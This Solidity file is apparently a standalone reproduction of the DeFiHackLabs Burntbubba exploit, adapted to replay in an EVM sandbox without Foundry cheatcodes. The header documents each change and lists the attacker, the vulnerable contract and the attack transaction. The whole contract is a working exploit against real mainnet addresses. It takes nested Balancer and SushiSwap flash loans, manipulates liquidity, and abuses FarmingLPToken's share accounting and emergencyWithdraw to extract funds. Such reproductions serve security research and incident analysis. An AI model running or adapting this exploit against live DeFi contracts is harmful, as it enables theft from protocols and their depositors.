// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Burntbubba_exp.sol test's testExploit()/receiveFlashLoan()/onFlashLoan()
// logic verbatim, but without inheriting forge-std Test/BaseTestWithBalanceLog
// (which depends on the Foundry cheatcode contract; that address has no code
// in a plain EVM replay, so any cheatcode call reverts before the real attack
// logic runs). Cheatcode-dependent bits from the original test are replaced:
//   1. `vm.createSelectFork(...)` — not needed; the config loads the exact
//      dumped fork state directly.
//   2. `makeAddr("toAddr")` — replaced with a fixed placeholder address
//      (TO_ADDR below); it only needs to be a fresh holder of the surplus
//      fLP shares, its identity is otherwise irrelevant to the attack.
//   3. `vm.label(...)` — cosmetic only in the original test, dropped.
//   4. `deal(address(AST), address(this), 2_062_557)` — replaced by the
//      config's `setup.steps` (a `dealToken` step) which writes the AST
//      balance-mapping slot directly before `testExploit()` runs.
//   5. `vm.load(originalAttackContract, bytes32(uint256(10)))` — the original
//      test cheat-reads slot 10 of the ORIGINAL on-chain attack contract
//      (0x4Bc69160…) to recover the exact LP amount that attacker's second
//      run targeted. That value is a fixed constant baked into the frozen
//      fork snapshot (confirmed against anvil_state.json:
//      accounts["0x4bc691601b50b3e107b89d5ea172b40a9dbc6251"].storage["0xa"]
//      == 0x12523ffe58c2 == 20144470251714), and there is no way to read
//      another contract's storage from plain Solidity — so it is hardcoded
//      as STORED_LP_TARGET below.
//   6. `emit log_named_decimal_uint(...)` (forge-std console logging only, no
//      effect on state) — dropped.

// @KeyInfo - Total Lost : ~$3K
// Attacker : https://etherscan.io/address/0x9d44f1a37044500064111010632a8a59003701c8
// Attack Contract : https://etherscan.io/address/0x4bc691601b50b3e107b89d5ea172b40a9dbc6251
// Vulnerable Contract : https://etherscan.io/address/0xa44e79a2c9a8965e7a6fa77bf0ca8faf50e6c73e
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x2b6d0af0dc513a15e325703405739057f9de6ef3f99934b957653b8a3fade4c6

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface ISushiUSDC is IERC20 {
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IUniPairV2 is IERC20 {
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

interface IUniRouterV2 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface ISushi {
    function flashLoan(address borrower, address receiver, address token, uint256 amount, bytes memory data) external;
}

interface IFarmingLPToken {
    function deposit(
        uint256 amountLP,
        address[] memory path0,
        address[] memory path1,
        uint256 amountMin,
        address beneficiary,
        uint256 deadline
    ) external;

    function transfer(address to, uint256 amount) external returns (bool);

    function emergencyWithdraw(address beneficiary) external;

    function withdrawableTotalLPs() external view returns (uint256);

    function totalShares() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
}

contract BurntbubbaExploit {
    IERC20 private constant AST = IERC20(0x27054b13b1B798B345b591a4d22e6562d47eA75a);
    IERC20 private constant SUSHI = IERC20(0x6B3595068778DD592e39A122f4f5a5cF09C90fE2);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ISushiUSDC private constant SushiUSDC = ISushiUSDC(0x397FF1542f962076d0BFE58eA045FfA2d347ACa0);
    IFarmingLPToken private constant FarmingLPToken = IFarmingLPToken(0xa44e79a2c9a8965e7A6FA77BF0ca8FAF50e6C73E);
    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ISushi private constant SushiSwap = ISushi(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    IUniRouterV2 private constant SushiRouter = IUniRouterV2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    IUniPairV2 private constant AST_SUSHI = IUniPairV2(0xd47f61BFCeA6e64F9D3FEC529C44153E04CB73B9);

    // Fresh placeholder address that only receives the surplus fLP shares
    // before `emergencyWithdraw` (mirrors the original test's `makeAddr("toAddr")`).
    address private constant TO_ADDR = address(0xBEEF000000000000000000000000000000BEEF);

    // See file header point 5: fixed constant read from the frozen fork state
    // (slot 10 of the original attack contract), in place of `vm.load`.
    uint256 private constant STORED_LP_TARGET = 20_144_470_251_714;

    function testExploit() public {
        // AST balance is seeded by the config's `setup.steps` (dealToken),
        // mirroring `deal(address(AST), address(this), 2_062_557)`.

        address[] memory tokens = new address[](2);
        tokens[0] = address(USDC);
        tokens[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 800e6;
        amounts[1] = 50e16;
        Balancer.flashLoan(address(this), tokens, amounts, bytes(""));
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        SushiSwap.flashLoan(address(this), address(this), address(SUSHI), 400_000e18, bytes("_"));
        USDC.transfer(address(Balancer), amounts[0]);
        WETH.transfer(address(Balancer), amounts[1]);
    }

    function onFlashLoan(address caller, address erc20Token, uint256 amount, uint256 feeAmount, bytes calldata data)
        external
    {
        approveAll();
        addLiquidity(address(USDC), address(WETH), 2e6, 1e15);
        addLiquidity(address(USDC), address(AST), 2e6, 10e3);
        addLiquidity(address(SUSHI), address(AST), amount, 10e3);

        address[] memory path0 = new address[](3);
        path0[0] = address(USDC);
        path0[1] = address(AST);
        path0[2] = address(SUSHI);
        address[] memory path1 = new address[](2);
        path1[0] = address(WETH);
        path1[1] = address(SUSHI);
        FarmingLPToken.deposit(
            SushiUSDC.balanceOf(address(this)), path0, path1, 0, address(this), block.timestamp + 1000
        );

        uint256 value = STORED_LP_TARGET;
        uint256 totalWithdrawableLPs = FarmingLPToken.withdrawableTotalLPs();
        uint256 totalShares = FarmingLPToken.totalShares();
        uint256 transferAmount =
            FarmingLPToken.balanceOf(address(this)) - ((value * totalShares) / totalWithdrawableLPs);
        // In the attack tx an amount of LPToken was transferred to a second
        // exploiter-controlled address before making the call to 'emergencyWithdraw'.
        FarmingLPToken.transfer(TO_ADDR, transferAmount);
        FarmingLPToken.emergencyWithdraw(address(this));
        SushiUSDC.transfer(address(SushiUSDC), SushiUSDC.balanceOf(address(this)));
        SushiUSDC.burn(address(this));
        AST_SUSHI.transfer(address(AST_SUSHI), AST_SUSHI.balanceOf(address(this)));
        AST_SUSHI.burn(address(this));

        uint256 amountOut = feeAmount + (feeAmount / 10);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(SUSHI);
        SushiRouter.swapTokensForExactTokens(amountOut, 200e15, path, address(this), block.timestamp + 1000);
        SUSHI.transfer(address(SushiSwap), amount + feeAmount);
    }

    function approveAll() private {
        USDC.approve(address(SushiRouter), type(uint256).max);
        WETH.approve(address(SushiRouter), type(uint256).max);
        AST.approve(address(SushiRouter), type(uint256).max);
        SUSHI.approve(address(SushiRouter), type(uint256).max);
        SushiUSDC.approve(address(FarmingLPToken), type(uint256).max);
    }

    function addLiquidity(address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired) private {
        SushiRouter.addLiquidity(
            tokenA, tokenB, amountADesired, amountBDesired, 0, 0, address(this), block.timestamp + 1000
        );
    }
}
